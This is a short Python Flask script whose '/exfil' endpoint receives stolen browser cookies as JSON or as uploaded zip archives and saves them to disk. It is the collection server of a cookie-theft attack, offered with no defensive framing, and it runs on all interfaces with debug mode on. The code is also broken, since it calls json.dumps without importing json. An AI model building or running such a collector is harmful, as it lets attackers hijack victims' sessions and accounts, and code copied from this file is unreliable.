from flask import Flask, request, jsonify
import time

app = Flask(__name__)

@app.route('/exfil', methods=['POST'])
def exfil():
    try:
        # Handle JSON cookies
        if request.is_json:
            data = request.get_json()
            with open(f'cookies_{int(time.time())}.json', 'w') as f:
                f.write(json.dumps(data, indent=2))
            print("Received cookies:", json.dumps(data, indent=2))
        
        # Handle file uploads
        if request.files:
            file = request.files['archive']
            file.save(f'cookie_files_{int(time.time())}.zip')
            print(f"Received file: {file.filename}")
        
        return jsonify({"status": "success"}), 200
    
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)  # Changed port to 5000